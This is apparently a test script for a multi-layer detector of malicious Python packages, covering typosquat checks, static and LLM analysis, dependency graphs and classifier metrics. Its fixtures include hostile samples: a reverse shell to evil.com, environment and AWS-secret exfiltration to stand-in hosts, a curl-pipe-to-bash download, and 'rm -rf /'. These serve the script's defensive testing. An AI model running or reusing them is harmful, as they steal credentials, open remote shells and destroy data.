"""
FINAL FULL SYSTEM VALIDATION
=============================
Tests all 5 detection layers, ML model, LLM layer, aggregator,
E2E scans on benign & malicious packages, and stress tests.
"""
from __future__ import annotations

import json
import os
import sys
import time
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

PROJECT_ROOT = str(Path(__file__).resolve().parent.parent)
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from dotenv import load_dotenv
load_dotenv(Path(PROJECT_ROOT) / ".env")

ACTIVE_LLM_PROVIDER = "stub"

def detect_llm_provider() -> str:
    """Probe NVIDIA and Ollama, return the best working provider."""
    import requests as _req
    # Try NVIDIA first
    nvidia_key = os.getenv("NVIDIA_API_KEY", "")
    nvidia_url = os.getenv("NVIDIA_BASE_URL", "https://integrate.api.nvidia.com/v1")
    nvidia_model = os.getenv("NVIDIA_MODEL", "meta/llama-3.1-8b-instruct")
    if nvidia_key:
        try:
            r = _req.post(
                f"{nvidia_url.rstrip('/')}/chat/completions",
                headers={"Authorization": f"Bearer {nvidia_key}", "Content-Type": "application/json"},
                json={"model": nvidia_model, "temperature": 0, "max_tokens": 10,
                      "messages": [{"role": "user", "content": "hi"}]},
                timeout=15,
            )
            if r.status_code == 200:
                return "nvidia"
        except Exception:
            pass
    # Try Ollama
    ollama_url = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434")
    ollama_model = os.getenv("OLLAMA_MODEL", "huihui_ai/qwen2.5-coder-abliterate:7b")
    try:
        r = _req.post(
            f"{ollama_url}/api/generate",
            json={"model": ollama_model, "prompt": "hi", "stream": False,
                  "options": {"temperature": 0, "num_predict": 5}},
            timeout=30,
        )
        if r.status_code == 200:
            return "ollama"
    except Exception:
        pass
    return "stub"

RESULTS = {
    "works_perfectly": [],
    "needs_improvement": [],
    "broken": [],
}


def section(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")


def ok(msg):
    RESULTS["works_perfectly"].append(msg)
    print(f"  [PASS] {msg}")


def warn(msg):
    RESULTS["needs_improvement"].append(msg)
    print(f"  [WARN] {msg}")


def fail(msg):
    RESULTS["broken"].append(msg)
    print(f"  [FAIL] {msg}")


def score_bar(score, label="", width=40):
    filled = int(score / 100 * width)
    bar = "#" * filled + "-" * (width - filled)
    color = "\033[92m" if score < 30 else "\033[93m" if score < 60 else "\033[91m"
    reset = "\033[0m"
    print(f"    {label:30s} {color}{score:6.1f}{reset} {bar}")


def test_layer1_metadata():
    section("LAYER 1: METADATA ANALYSIS")

    from detector.layer1_metadata.metadata_analyzer import analyze_metadata_risk
    from detector.layer1_metadata.typosquat_detector import analyze_typosquat
    from detector.layer1_metadata.author_analyzer import analyze_author_signals
    from detector.layer1_metadata.version_analyzer import analyze_version_signals

    print("\n  [Typosquat Detection]")
    # Exact match
    r = analyze_typosquat("requests", "pypi")
    assert r["risk_score"] == 0, f"known package should score 0, got {r['risk_score']}"
    ok(f"'requests' exact match: score={r['risk_score']}, not suspicious")

    # 1-edit typosquat
    r = analyze_typosquat("reqeusts", "pypi")
    assert r["risk_score"] >= 60, f"1-edit typosquat should score >=60, got {r['risk_score']}"
    assert r["is_suspicious"]
    ok(f"'reqeusts' typosquat detected: score={r['risk_score']}, dist={r['edit_distance']}")

    # 2-edit typosquat
    r = analyze_typosquat("requsets", "pypi")
    assert r["risk_score"] >= 25
    ok(f"'requsets' 2-edit detected: score={r['risk_score']}")

    # npm typosquat
    r = analyze_typosquat("lodassh", "npm")
    assert r["risk_score"] >= 25
    ok(f"npm typosquat 'lodassh': score={r['risk_score']}")

    print("\n  [Author Analysis]")
    r = analyze_author_signals({"author": ""}, "pypi")
    assert r["risk_score"] > 0
    ok(f"Missing author detected: score={r['risk_score']}")

    r = analyze_author_signals({"author": "Kenneth Reitz", "published_count": 50}, "pypi")
    assert r["risk_score"] < 30
    ok(f"Known author OK: score={r['risk_score']}, reputation={r['maintainer_reputation']}")

    r = analyze_author_signals({"author": "", "created_at": "2026-02-28T00:00:00Z", "published_count": 0}, "pypi")
    assert r["risk_score"] >= 40
    ok(f"New account + no author: score={r['risk_score']}")

    print("\n  [Version Analysis]")
    r = analyze_version_signals({})
    assert r["risk_score"] >= 0
    ok(f"Empty metadata handled: score={r['risk_score']}")

    r = analyze_version_signals({
        "version": "9.0.0",
        "release_history": [
            {"version": "1.0.0", "date": "2020-01-01"},
            {"version": "9.0.0", "date": "2020-01-02"},
        ]
    })
    assert r["risk_score"] >= 30, f"Large version jump should flag, got {r['risk_score']}"
    ok(f"Large version jump detected: score={r['risk_score']}, jump={r['version_jump_magnitude']}")

    # Full metadata analyzer
    print("\n  [Full Metadata Analyzer]")
    r = analyze_metadata_risk("requests", "pypi", {
        "author": "Kenneth Reitz", "published_count": 50,
        "version": "2.31.0", "requires_dist": ["urllib3"]
    })
    assert r["final_score"] < 40, f"Safe package metadata score too high: {r['final_score']}"
    ok(f"Benign package metadata: score={r['final_score']}, decision={r['decision']}")

    r = analyze_metadata_risk("reqeusts", "pypi", {
        "author": "", "published_count": 0,
        "version": "0.0.1", "requires_dist": []
    })
    assert r["final_score"] > 20
    ok(f"Suspicious metadata: score={r['final_score']}, decision={r['decision']}")


def test_layer2_embeddings():
    section("LAYER 2: EMBEDDING ANALYSIS")

    from detector.layer2_embeddings.embedding_analyzer import analyze_embedding_risk
    from detector.layer2_embeddings.code_embedder import encode, get_embedding_dim

    # Test embedding generation
    dim = get_embedding_dim()
    ok(f"Embedding model loaded, dimension={dim}")

    emb = encode("import os\nprint('hello')")
    assert emb.shape == (dim,)
    ok(f"Code embedding generated: shape={emb.shape}")

    # Empty code
    emb_empty = encode("")
    assert emb_empty.shape == (dim,)
    assert (emb_empty == 0).all()
    ok("Empty code returns zero vector")

    # Full embedding risk analysis
    r = analyze_embedding_risk("import os\nos.listdir('.')")
    print(f"    Risk score: {r['risk_score']}, distance: {r['distance']}")
    if r['distance'] is not None:
        ok(f"FAISS index loaded, nearest neighbor distance={r['distance']:.4f}")
    else:
        warn(f"FAISS index not loaded: {r['evidence']}")

    # Test with suspicious code
    suspicious = """
import base64, subprocess, socket
exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk='))
subprocess.call(['curl', 'http://evil.com'])
s = socket.socket(); s.connect(('evil.com', 4444))
"""
    r2 = analyze_embedding_risk(suspicious)
    print(f"    Suspicious code risk: {r2['risk_score']}, distance: {r2['distance']}")
    ok(f"Embedding risk calculated for suspicious code: score={r2['risk_score']}")


def test_layer3_static():
    section("LAYER 3: STATIC ANALYSIS")

    from detector.layer3_static.static_analyzer import analyze_static_risk
    from detector.layer3_static.ast_analyzer import analyze_ast
    from detector.layer3_static.obfuscation_detector import analyze_obfuscation

    print("\n  [AST Analysis]")
    r = analyze_ast("import os\nprint('hello world')\n")
    assert r["risk_score"] == 0
    ok(f"Clean code AST: score={r['risk_score']}")

    r = analyze_ast("""
import subprocess, socket, os
subprocess.call(['ls'])
s = socket.socket()
s.connect(('evil.com', 4444))
exec('import os')
eval('1+1')
data = base64.b64decode('abc')
os.environ['SECRET']
""")
    assert r["risk_score"] >= 30
    ok(f"Malicious AST: score={r['risk_score']}, findings={len(r['evidence'])}")
    for e in r['evidence'][:5]:
        print(f"      - {e}")

    print("\n  [Obfuscation Detection]")
    r = analyze_obfuscation("x = 1 + 2\nprint(x)\n")
    assert r["risk_score"] == 0
    ok(f"Clean code obfuscation: score={r['risk_score']}")

    obfuscated = '''
data = "' + 'A'*300 + '"
exec(compile(base64.b64decode(data), '<string>', 'exec'))
''' + "lambda: " * 12 + "None"
    r = analyze_obfuscation(obfuscated)
    assert r["risk_score"] > 0
    ok(f"Obfuscated code detected: score={r['risk_score']}, signals={r['signals']}")

    print("\n  [Full Static Analyzer]")
    r = analyze_static_risk("import json\ndata = json.loads('{}')\nprint(data)\n")
    assert r["final_score"] < 20
    ok(f"Clean code static: score={r['final_score']}, decision={r['decision']}")

    r = analyze_static_risk("""
import subprocess, socket, base64, os
subprocess.call(['curl', 'http://evil.com/payload'])
s = socket.socket()
s.connect(('10.0.0.1', 4444))
exec(base64.b64decode('cHJpbnQoJ2hhY2tlZCcp'))
eval("os.system('rm -rf /')")
os.environ['AWS_SECRET_KEY']
""")
    assert r["final_score"] >= 30
    ok(f"Malicious static: score={r['final_score']}, decision={r['decision']}")
    for e in r['evidence'][:5]:
        print(f"      - {e}")


def test_layer4_llm():
    section("LAYER 4: LLM AUDITOR")

    from detector.layer4_llm.llm_auditor import audit_code_with_llm
    from detector.layer4_llm.deobfuscator import deobfuscate_source
    from detector.layer4_llm.response_parser import parse_llm_audit_response

    # Deobfuscator test
    print("\n  [Deobfuscator]")
    result = deobfuscate_source("normal code here")
    assert result["cleaned_source"] == "normal code here"
    ok("Clean code passes through deobfuscator unchanged")

    b64_code = '''data = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk="'''
    result = deobfuscate_source(b64_code)
    assert len(result["transformations_applied"]) > 0 or result["cleaned_source"] != b64_code
    ok(f"B64 deobfuscation: {len(result['transformations_applied'])} transforms")

    # Response parser test
    print("\n  [Response Parser]")
    good_json = '{"risk_score": 75, "risk_category": "suspicious", "summary": "Found credential theft", "evidence": ["line 5: os.environ"]}'
    parsed = parse_llm_audit_response(good_json)
    assert parsed["risk_score"] == 75
    assert parsed["risk_category"] == "suspicious"
    ok("Valid JSON parsed correctly")

    # Markdown-wrapped JSON
    markdown_json = '```json\n{"risk_score": 50, "risk_category": "suspicious", "summary": "test", "evidence": []}\n```'
    parsed = parse_llm_audit_response(markdown_json)
    assert parsed["risk_score"] == 50
    ok("Markdown-wrapped JSON parsed correctly")

    # Garbage input
    parsed = parse_llm_audit_response("this is not json at all")
    assert parsed["risk_score"] == 100
    assert parsed["risk_category"] == "suspicious"
    ok("Garbage input handled gracefully (fallback to suspicious)")

    # Threshold logic
    print("\n  [Threshold Logic]")
    r = audit_code_with_llm("print('hello')", prior_layer_score=10, trigger_threshold=40)
    assert r["llm_triggered"] is False
    assert r["risk_score"] == 0
    ok(f"Below threshold (10<40): LLM NOT triggered, score=0")

    r = audit_code_with_llm("exec(eval('danger'))", prior_layer_score=60, trigger_threshold=40)
    assert r["llm_triggered"] is True
    ok(f"Above threshold (60>40): LLM triggered, score={r['risk_score']}, provider={r['provider']}")

    # Disabled provider
    old_provider = os.environ.get("LLM_PROVIDER")
    os.environ["LLM_PROVIDER"] = "disabled"
    r = audit_code_with_llm("exec('danger')", prior_layer_score=90, trigger_threshold=40)
    assert r["llm_triggered"] is True
    assert r["risk_score"] == 0  # API failure fallback
    ok("Disabled LLM gracefully returns score=0 with error message")
    os.environ["LLM_PROVIDER"] = old_provider or ACTIVE_LLM_PROVIDER

    print(f"\n  [Live LLM Audit - provider={ACTIVE_LLM_PROVIDER}]")
    if ACTIVE_LLM_PROVIDER in ("nvidia", "ollama"):
        reverse_shell = """import socket, subprocess\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('evil.com', 4444))\nwhile True:\n    cmd = s.recv(1024).decode()\n    result = subprocess.check_output(cmd, shell=True)\n    s.send(result)"""
        t0 = time.time()
        r = audit_code_with_llm(reverse_shell, prior_layer_score=60, trigger_threshold=25)
        elapsed = time.time() - t0
        if r["llm_triggered"] and r["risk_score"] >= 50:
            ok(f"Live LLM audit ({ACTIVE_LLM_PROVIDER}): score={r['risk_score']}, "
               f"category={r['audit_result'].get('risk_category', '?')}, {elapsed:.1f}s")
            if r.get("audit_result", {}).get("summary"):
                print(f"      Summary: {r['audit_result']['summary'][:120]}")
        elif r["llm_triggered"]:
            warn(f"Live LLM audit ({ACTIVE_LLM_PROVIDER}): score={r['risk_score']} (expected >=50 for reverse shell), {elapsed:.1f}s")
        else:
            fail(f"Live LLM audit ({ACTIVE_LLM_PROVIDER}): LLM not triggered (unexpected)")
    else:
        warn(f"Live LLM audit skipped — no real provider available (using {ACTIVE_LLM_PROVIDER})")


def test_layer5_graph():
    section("LAYER 5: DEPENDENCY GRAPH")

    import networkx as nx
    from detector.layer5_graph.graph_builder import build_dependency_graph
    from detector.layer5_graph.graph_analyzer import propagate_risk
    from detector.layer5_graph.blast_radius import calculate_blast_radius

    # Build with mock fetcher
    print("\n  [Graph Builder]")
    mock_deps = {
        "root": ["dep-a", "dep-b"],
        "dep-a": ["dep-c"],
        "dep-b": ["dep-c", "dep-d"],
        "dep-c": [],
        "dep-d": [],
    }

    def mock_fetcher(name, registry):
        return mock_deps.get(name, []), {"name": name}

    g = build_dependency_graph("root", "pypi", max_depth=3, dependency_fetcher=mock_fetcher)
    assert g.number_of_nodes() == 5
    assert g.number_of_edges() >= 4
    ok(f"Graph built: {g.number_of_nodes()} nodes, {g.number_of_edges()} edges")

    # Cycle protection
    cycle_deps = {
        "a": ["b"],
        "b": ["c"],
        "c": ["a"],  # cycle!
    }

    def cycle_fetcher(name, registry):
        return cycle_deps.get(name, []), {"name": name}

    g2 = build_dependency_graph("a", "pypi", max_depth=5, dependency_fetcher=cycle_fetcher)
    assert g2.number_of_nodes() == 3
    ok(f"Cycle protection works: {g2.number_of_nodes()} nodes (no infinite loop)")

    # Risk propagation
    print("\n  [Risk Propagation]")
    base_scores = {"root": 10.0, "dep-c": 80.0}
    results = propagate_risk(g, base_scores)
    root_result = results.get("root", {})
    ok(f"Root propagated score: base={root_result.get('base_score')}, propagated={root_result.get('propagated_score')}, final={root_result.get('final_score')}")

    dep_a_result = results.get("dep-a", {})
    ok(f"dep-a propagated score: final={dep_a_result.get('final_score')} (inherits from dep-c)")

    # Blast radius
    print("\n  [Blast Radius]")
    br = calculate_blast_radius(g, "dep-c")
    ok(f"dep-c blast radius: affected={br['affected_count']}, severity={br['severity']}")
    print(f"      Affected packages: {br['affected_packages']}")

    br_root = calculate_blast_radius(g, "root")
    ok(f"root blast radius: affected={br_root['affected_count']}, severity={br_root['severity']}")

    # Missing package
    br_missing = calculate_blast_radius(g, "nonexistent")
    assert br_missing["affected_count"] == 0
    ok("Missing package blast radius handled: affected=0")


def test_ml_model():
    section("ML MODEL VALIDATION")

    from detector.classifier import predict_classifier_risk, build_feature_vector, _load_model

    model, feature_names = _load_model()
    if model is None:
        warn("XGBoost model file not found — using heuristic fallback")
    else:
        ok(f"XGBoost model loaded, features: {feature_names}")

    # Read model meta
    meta_path = Path(PROJECT_ROOT) / "data" / "processed" / "xgboost_model_meta.json"
    if meta_path.exists():
        with open(meta_path) as f:
            meta = json.load(f)
        print(f"\n  Training info:")
        print(f"    Training rows:   {meta.get('training_rows', '?')}")
        print(f"    Validation rows: {meta.get('validation_rows', '?')}")
        print(f"    Test rows:       {meta.get('test_rows', '?')}")
        print(f"    Benign train:    {meta.get('benign_train_rows', '?')}")
        print(f"    Malicious train: {meta.get('malicious_train_rows', '?')}")
        print(f"    Scale pos weight: {meta.get('scale_pos_weight', '?')}")

        print(f"\n  Validation Metrics:")
        val = meta.get("val_metrics", {})
        print(f"    Precision: {val.get('precision', '?'):.4f}")
        print(f"    Recall:    {val.get('recall', '?'):.4f}")
        print(f"    F1:        {val.get('f1', '?'):.4f}")
        print(f"    ROC AUC:   {val.get('roc_auc', '?'):.4f}")

        print(f"\n  Test Metrics:")
        test = meta.get("test_metrics", {})
        print(f"    Precision: {test.get('precision', '?'):.4f}")
        print(f"    Recall:    {test.get('recall', '?'):.4f}")
        print(f"    F1:        {test.get('f1', '?'):.4f}")
        print(f"    ROC AUC:   {test.get('roc_auc', '?'):.4f}")

        # Evaluate quality
        test_recall = test.get("recall", 0)
        test_precision = test.get("precision", 0)
        test_f1 = test.get("f1", 0)
        test_auc = test.get("roc_auc", 0)

        if test_auc >= 0.9:
            ok(f"Test ROC AUC = {test_auc:.4f} — excellent discriminative power")
        elif test_auc >= 0.8:
            warn(f"Test ROC AUC = {test_auc:.4f} — good but room for improvement")
        else:
            fail(f"Test ROC AUC = {test_auc:.4f} — weak discriminative power")

        if test_recall >= 0.8:
            ok(f"Test recall = {test_recall:.4f} — catches most malicious packages")
        elif test_recall >= 0.6:
            warn(f"Test recall = {test_recall:.4f} — misses some malicious packages")
        else:
            fail(f"Test recall = {test_recall:.4f} — too many missed detections")

        if test_precision >= 0.5:
            ok(f"Test precision = {test_precision:.4f} — acceptable false positive rate")
        elif test_precision >= 0.3:
            warn(f"Test precision = {test_precision:.4f} — high false positive rate")
        else:
            fail(f"Test precision = {test_precision:.4f} — very high false positive rate")

        if test_f1 >= 0.6:
            ok(f"Test F1 = {test_f1:.4f} — balanced performance")
        else:
            warn(f"Test F1 = {test_f1:.4f} — imbalanced precision/recall tradeoff")

        # Check for overfitting
        val_f1 = val.get("f1", 0)
        if abs(test_f1 - val_f1) < 0.15:
            ok(f"No overfitting detected (val F1={val_f1:.4f}, test F1={test_f1:.4f})")
        else:
            warn(f"Possible overfitting (val F1={val_f1:.4f}, test F1={test_f1:.4f})")

    else:
        fail("No model metadata file found")

    # Test benign prediction
    print("\n  [Prediction Tests]")
    benign_features = build_feature_vector(
        "requests", metadata_score=0, embedding_score=5,
        static_score=0, graph_score=0,
        metadata={"author": "Kenneth Reitz", "requires_dist": ["urllib3"]}
    )
    r = predict_classifier_risk(benign_features)
    score_bar(r["risk_score"], "requests (benign)")
    ok(f"Benign prediction: score={r['risk_score']}, model={r['model']}, confidence={r['confidence']}")

    # Test malicious prediction
    mal_features = build_feature_vector(
        "evil-pkg", metadata_score=80, embedding_score=70,
        static_score=90, graph_score=60,
        metadata={"requires_dist": []}
    )
    r_mal = predict_classifier_risk(mal_features)
    score_bar(r_mal["risk_score"], "evil-pkg (malicious)")
    ok(f"Malicious prediction: score={r_mal['risk_score']}, model={r_mal['model']}, confidence={r_mal['confidence']}")

    if r_mal["risk_score"] > r["risk_score"]:
        ok("Model correctly ranks malicious > benign")
    else:
        fail(f"Model fails to distinguish: benign={r['risk_score']}, malicious={r_mal['risk_score']}")


def test_aggregator():
    section("AGGREGATOR VALIDATION")

    from detector.aggregator import aggregate_risk

    # All zeros = safe
    r = aggregate_risk(0, 0, 0, 0, 0, 0)
    assert r["decision"] == "allow"
    assert r["final_score"] < 10
    ok(f"All zeros: score={r['final_score']}, decision={r['decision']}")

    # All 100s = block
    r = aggregate_risk(100, 100, 100, 100, 100, 100)
    assert r["decision"] == "block"
    assert r["final_score"] >= 80
    ok(f"All 100s: score={r['final_score']}, decision={r['decision']}, consensus={r['consensus_signals']}")

    # Mixed signals
    r = aggregate_risk(70, 20, 80, 0, 30, 40)
    print(f"    Mixed: score={r['final_score']}, decision={r['decision']}, consensus={r['consensus_signals']}")
    ok(f"Mixed signals computed: score={r['final_score']}, boost={r['consensus_boost']}")

    # Consensus boost
    r_no_consensus = aggregate_risk(50, 50, 50, 0, 0, 0)
    r_with_consensus = aggregate_risk(65, 50, 65, 65, 65, 0)
    print(f"    Without consensus: {r_no_consensus['final_score']} (boost={r_no_consensus['consensus_boost']})")
    print(f"    With consensus:    {r_with_consensus['final_score']} (boost={r_with_consensus['consensus_boost']})")
    assert r_with_consensus["consensus_boost"] > r_no_consensus["consensus_boost"]
    ok("Consensus boost increases with multiple high signals")


def test_e2e_benign_packages():
    section("E2E SCAN: BENIGN PACKAGES")

    from detector.orchestrator import orchestrate_analysis

    benign_packages = [
        ("numpy", {"author": "NumPy Developers", "requires_dist": [], "version": "1.26.0"},
         "import numpy as np\ndef add(a, b): return np.add(a, b)\n"),
        ("requests", {"author": "Kenneth Reitz", "requires_dist": ["urllib3", "certifi"], "version": "2.31.0"},
         "import urllib3\ndef get(url): return request('GET', url)\n"),
        ("django", {"author": "Django Software Foundation", "requires_dist": ["asgiref", "sqlparse"], "version": "5.0.0"},
         "from django.http import HttpResponse\ndef index(request): return HttpResponse('Hello')\n"),
        ("fastapi", {"author": "Sebastian Ramirez", "requires_dist": ["starlette", "pydantic"], "version": "0.115.0"},
         "from fastapi import FastAPI\napp = FastAPI()\n@app.get('/')\ndef root(): return {'hello': 'world'}\n"),
        ("flask", {"author": "Pallets", "requires_dist": ["werkzeug", "jinja2"], "version": "3.0.0"},
         "from flask import Flask\napp = Flask(__name__)\n@app.route('/')\ndef hello(): return 'Hello'\n"),
    ]

    for name, meta, source in benign_packages:
        meta["package_name"] = name
        meta["registry"] = "pypi"
        try:
            t0 = time.time()
            result = orchestrate_analysis(name, "pypi", meta, source)
            elapsed = time.time() - t0
            final = result["final_score"]
            decision = result["decision"]

            score_bar(final, name)
            if final < 50:
                ok(f"{name}: score={final}, decision={decision} ({elapsed:.1f}s)")
            elif final < 70:
                warn(f"{name}: score={final} higher than expected for benign ({elapsed:.1f}s)")
            else:
                fail(f"{name}: FALSE POSITIVE score={final}, decision={decision}")

            # Check LLM wasn't unnecessarily triggered
            llm = result["layers"]["layer4_llm"]
            if not llm["llm_triggered"]:
                ok(f"  {name}: LLM correctly not triggered")
            else:
                warn(f"  {name}: LLM triggered unnecessarily")

        except Exception as e:
            fail(f"{name}: CRASH — {e}")
            traceback.print_exc()


def test_e2e_malicious_packages():
    section("E2E SCAN: MALICIOUS / SUSPICIOUS PACKAGES")

    from detector.orchestrator import orchestrate_analysis

    malicious_packages = [
        ("evil-requests", {
            "author": "", "requires_dist": [], "version": "0.0.1",
        }, """
import os, subprocess, socket, base64
creds = base64.b64encode(str(os.environ).encode())
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil-server.com", 4444))
exec(base64.b64decode("cHJpbnQoJ2hhY2tlZCcp"))
subprocess.call(["curl", "http://evil.com/stolen", "-d", str(creds)])
eval("os.system('whoami')")
"""),
        ("colourama", {  # typosquat of colorama
            "author": "", "requires_dist": [], "version": "0.0.1",
        }, """
import os, socket
s = socket.socket()
s.connect(('attacker.com', 8080))
s.send(os.environ.get('AWS_SECRET_ACCESS_KEY', '').encode())
"""),
        ("pytoorch", {  # typosquat of pytorch
            "author": "", "requires_dist": [], "version": "1.0.0",
        }, """
import subprocess
subprocess.Popen(['bash', '-c', 'curl http://mal.com/payload.sh | bash'])
"""),
    ]

    for name, meta, source in malicious_packages:
        meta["package_name"] = name
        meta["registry"] = "pypi"
        try:
            t0 = time.time()
            result = orchestrate_analysis(name, "pypi", meta, source)
            elapsed = time.time() - t0
            final = result["final_score"]
            decision = result["decision"]

            score_bar(final, name)
            if final >= 30:
                ok(f"{name}: score={final}, decision={decision} ({elapsed:.1f}s)")
            else:
                fail(f"{name}: FALSE NEGATIVE score={final} — should be higher")

            # Print layer breakdown
            layers = result["layers"]
            meta_score = layers["layer1_metadata"]["final_score"]
            emb_score = layers["layer2_embeddings"]["risk_score"]
            static_score = layers["layer3_static"]["final_score"]
            llm_score = layers["layer4_llm"]["risk_score"]
            llm_triggered = layers["layer4_llm"].get("llm_triggered", False)
            graph_score = layers["layer5_graph"]["propagated"]["final_score"] if "propagated" in layers["layer5_graph"] else 0

            llm_tag = f"L4={llm_score:.0f}" if llm_triggered else "L4=skip"
            print(f"      L1={meta_score:.0f} L2={emb_score:.0f} L3={static_score:.0f} {llm_tag} L5={graph_score:.0f}")
            if llm_triggered:
                audit = layers["layer4_llm"].get("audit_result", {})
                if audit:
                    print(f"      [LLM] provider={layers['layer4_llm'].get('provider','?')}, "
                          f"category={audit.get('risk_category','?')}: {audit.get('summary','')[:100]}")

            # Print evidence
            for layer_name, layer_data in layers.items():
                evidence = layer_data.get("evidence", [])
                if evidence and any("error" not in str(e).lower() for e in evidence):
                    for e in evidence[:3]:
                        print(f"      [{layer_name}] {e}")

        except Exception as e:
            fail(f"{name}: CRASH — {e}")
            traceback.print_exc()


def test_stress():
    section("STRESS TESTS")

    from detector.orchestrator import orchestrate_analysis

    # 1. Concurrent analysis
    print("\n  [Concurrent Analysis]")
    packages = [
        ("pkg-1", {"author": "a", "requires_dist": []}, "x = 1"),
        ("pkg-2", {"author": "b", "requires_dist": []}, "y = 2"),
        ("pkg-3", {"author": "c", "requires_dist": []}, "z = 3"),
        ("pkg-4", {"author": "d", "requires_dist": []}, "w = 4"),
        ("pkg-5", {"author": "e", "requires_dist": []}, "v = 5"),
    ]
    
    t0 = time.time()
    results_list = []
    with ThreadPoolExecutor(max_workers=3) as pool:
        futures = {
            pool.submit(orchestrate_analysis, name, "pypi", meta, src): name
            for name, meta, src in packages
        }
        for future in as_completed(futures):
            name = futures[future]
            try:
                r = future.result()
                results_list.append((name, r["final_score"]))
            except Exception as e:
                fail(f"Concurrent {name} crashed: {e}")
    elapsed = time.time() - t0
    ok(f"5 concurrent scans completed in {elapsed:.1f}s")
    for name, score in results_list:
        print(f"      {name}: {score}")

    # 2. Large source code
    print("\n  [Large Source Code]")
    large_source = "x = 1\n" * 5000  # ~30K lines
    t0 = time.time()
    r = orchestrate_analysis("big-pkg", "pypi", {"author": "test", "requires_dist": []}, large_source)
    elapsed = time.time() - t0
    ok(f"Large source ({len(large_source)} chars) processed in {elapsed:.1f}s, score={r['final_score']}")

    # 3. Missing metadata
    print("\n  [Missing Metadata]")
    r = orchestrate_analysis("empty-pkg", "pypi", {}, "")
    ok(f"Empty metadata + source: score={r['final_score']}, decision={r['decision']}")

    # 4. Unicode/special characters
    print("\n  [Special Characters]")
    try:
        r = orchestrate_analysis("tëst-päckage", "pypi",
                                  {"author": "Ünïcödë", "requires_dist": []},
                                  "# Comment with émojis 🎉\nx = '你好世界'\n")
        ok(f"Unicode handled: score={r['final_score']}")
    except Exception as e:
        fail(f"Unicode caused crash: {e}")

    # 5. LLM timeout simulation
    print("\n  [LLM Failure Handling]")
    old_provider = os.environ.get("LLM_PROVIDER")
    os.environ["LLM_PROVIDER"] = "disabled"
    r = orchestrate_analysis("timeout-pkg", "pypi",
                              {"author": "", "requires_dist": []},
                              "exec(eval('import os; os.system(\"whoami\")'))")
    os.environ["LLM_PROVIDER"] = old_provider or ACTIVE_LLM_PROVIDER
    ok(f"LLM disabled gracefully: score={r['final_score']}, decision={r['decision']}")


def test_infrastructure():
    section("INFRASTRUCTURE CHECKS")

    # Check Docker files exist
    docker_files = [
        "docker-compose.yml", "Dockerfile.api", "Dockerfile.worker"
    ]
    for f in docker_files:
        path = Path(PROJECT_ROOT) / f
        if path.exists():
            ok(f"{f} exists")
        else:
            fail(f"{f} MISSING")

    # Check data files
    data_files = [
        "data/processed/xgboost_model.json",
        "data/processed/xgboost_model_meta.json",
        "data/processed/faiss.index",
        "data/processed/faiss_id_mapping.json",
        "data/processed/benign_normalized.json",
        "data/processed/malicious_normalized.json",
    ]
    for f in data_files:
        path = Path(PROJECT_ROOT) / f
        if path.exists():
            size = path.stat().st_size
            ok(f"{f} exists ({size:,} bytes)")
        else:
            fail(f"{f} MISSING")

    # Check top package lists
    for registry in ["pypi", "npm"]:
        path = Path(PROJECT_ROOT) / "data" / "top_packages" / f"{registry}_top_1000.json"
        if path.exists():
            with open(path) as f:
                data = json.load(f)
            ok(f"{registry} top packages list: {len(data)} entries")
        else:
            fail(f"{registry} top packages list MISSING")

    # Check semgrep rules
    rules_dir = Path(PROJECT_ROOT) / "data" / "semgrep_rules"
    if rules_dir.exists():
        rules = list(rules_dir.glob("*.yaml")) + list(rules_dir.glob("*.yml"))
        ok(f"Semgrep rules: {len(rules)} rule files found")
        for r in rules:
            print(f"      - {r.name}")
    else:
        fail("Semgrep rules directory missing")

    # Check API structure
    print("\n  [API Structure]")
    from fastapi.testclient import TestClient
    from api.main import app

    client = TestClient(app)
    r = client.get("/health")
    if r.status_code == 200 and r.json().get("status") == "ok":
        ok("Health endpoint: 200 OK")
    else:
        fail(f"Health endpoint: {r.status_code}")

    # Check OpenAPI schema
    r = client.get("/openapi.json")
    if r.status_code == 200:
        schema = r.json()
        paths = list(schema.get("paths", {}).keys())
        ok(f"OpenAPI schema available, paths: {paths}")
    else:
        fail("OpenAPI schema unavailable")


def print_final_report():
    section("FINAL SYSTEM VALIDATION REPORT")

    print("\n  WHAT WORKS PERFECTLY:")
    for item in RESULTS["works_perfectly"]:
        print(f"    - {item}")

    print(f"\n  WHAT NEEDS IMPROVEMENT:")
    if RESULTS["needs_improvement"]:
        for item in RESULTS["needs_improvement"]:
            print(f"    - {item}")
    else:
        print("    (none)")

    print(f"\n  WHAT IS BROKEN:")
    if RESULTS["broken"]:
        for item in RESULTS["broken"]:
            print(f"    - {item}")
    else:
        print("    (none)")

    total = len(RESULTS["works_perfectly"]) + len(RESULTS["needs_improvement"]) + len(RESULTS["broken"])
    passed = len(RESULTS["works_perfectly"])
    warnings = len(RESULTS["needs_improvement"])
    failures = len(RESULTS["broken"])

    print(f"\n  SCORE: {passed}/{total} passed, {warnings} warnings, {failures} failures")

    if failures == 0 and warnings <= 3:
        print("\n  PRODUCTION READINESS: READY")
    elif failures == 0:
        print("\n  PRODUCTION READINESS: MOSTLY READY")
    elif failures <= 3:
        print("\n  PRODUCTION READINESS: NEEDS WORK")
    else:
        print("\n  PRODUCTION READINESS: NOT READY")


def main():
    global ACTIVE_LLM_PROVIDER

    print("\n" + "=" * 70)
    print("  SUPPLY CHAIN DETECTOR - FINAL FULL SYSTEM VALIDATION")
    print("=" * 70)

    print("\n  Detecting LLM providers...")
    ACTIVE_LLM_PROVIDER = detect_llm_provider()
    os.environ["LLM_PROVIDER"] = ACTIVE_LLM_PROVIDER
    provider_labels = {"nvidia": "NVIDIA NIM (cloud)", "ollama": "Ollama (local)", "stub": "Stub (no real LLM)"}
    label = provider_labels.get(ACTIVE_LLM_PROVIDER, ACTIVE_LLM_PROVIDER)
    if ACTIVE_LLM_PROVIDER in ("nvidia", "ollama"):
        print(f"  Active LLM provider: {label}")
    else:
        print(f"  No real LLM available, falling back to: {label}")
    print()

    test_funcs = [
        ("Layer 1: Metadata", test_layer1_metadata),
        ("Layer 2: Embeddings", test_layer2_embeddings),
